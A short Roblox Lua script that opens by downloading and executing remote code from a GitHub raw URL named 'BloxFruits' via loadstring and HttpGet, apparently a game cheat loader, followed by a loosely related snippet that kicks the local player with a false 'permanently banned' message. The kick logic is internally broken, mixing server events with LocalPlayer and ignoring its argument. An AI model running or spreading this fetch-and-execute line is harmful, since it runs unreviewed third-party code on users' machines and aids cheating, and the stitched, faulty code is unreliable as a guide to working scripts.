
loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()

-- This script should be placed in a ServerScript or LocalScript

local Players = game:GetService("Players")

-- Function to kick the player
local function kickPlayer(player)
    wait(5) -- Wait for 5 seconds
    game.Players.LocalPlayer:Kick("You have been permanently banned.")
end

-- Connect to the PlayerAdded event
Players.PlayerAdded:Connect(function(player)
    kickPlayer(player) -- Call the function to kick the player
end)
